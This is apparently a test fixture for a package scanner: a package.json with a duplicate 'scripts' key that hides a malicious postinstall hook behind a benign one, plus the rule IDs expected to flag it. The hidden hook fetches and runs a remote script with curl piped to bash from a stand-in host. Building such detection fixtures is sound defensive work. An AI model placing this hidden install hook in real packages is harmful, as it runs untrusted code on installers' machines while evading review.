@@ -1,0 +1,8 @@
+Second 'scripts' key hides the real postinstall from reviewers.
+expect: PCL-ENG-003 PCL-EXE-013
+-- package.json --
+{
+  "name": "demo",
+  "scripts": {"postinstall": "node build.js"},
+  "scripts": {"postinstall": "bash <(curl -s https://example.invalid/p)"}
+}
